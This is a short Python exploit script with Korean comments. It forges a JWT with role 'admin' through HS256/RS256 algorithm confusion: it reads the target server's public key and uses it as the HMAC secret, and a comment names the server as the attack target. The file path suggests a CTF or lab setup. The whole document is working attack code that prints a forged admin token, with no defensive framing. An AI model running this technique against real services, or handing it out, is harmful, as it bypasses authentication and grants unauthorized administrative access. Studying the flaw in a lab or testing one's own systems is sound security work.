import jwt
import base64
import json
import hmac
import hashlib

# 공개키를 문자열로 읽기 (공격 대상 서버에서 제공된 public.pem)
with open('./deploy/app/key/public.pem', 'r') as f:
    pubkey = f.read()

# JWT Header와 Payload
header = {"alg": "HS256", "typ": "JWT"}
payload = {"role": "admin", "iat": 1747927825}

# Base64 인코딩 (URL-safe, no padding)
def b64encode(obj):
    return base64.urlsafe_b64encode(json.dumps(obj).encode()).rstrip(b'=')

b64_header = b64encode(header)
b64_payload = b64encode(payload)

# HMAC-SHA256 서명 (공개키를 비밀키처럼 사용)
msg = b'.'.join([b64_header, b64_payload])
signature = hmac.new(pubkey.encode(), msg, hashlib.sha256).digest()
b64_signature = base64.urlsafe_b64encode(signature).rstrip(b'=')

# JWT 토큰 구성
token = b'.'.join([b64_header, b64_payload, b64_signature]).decode()
print("Forged JWT:", token)
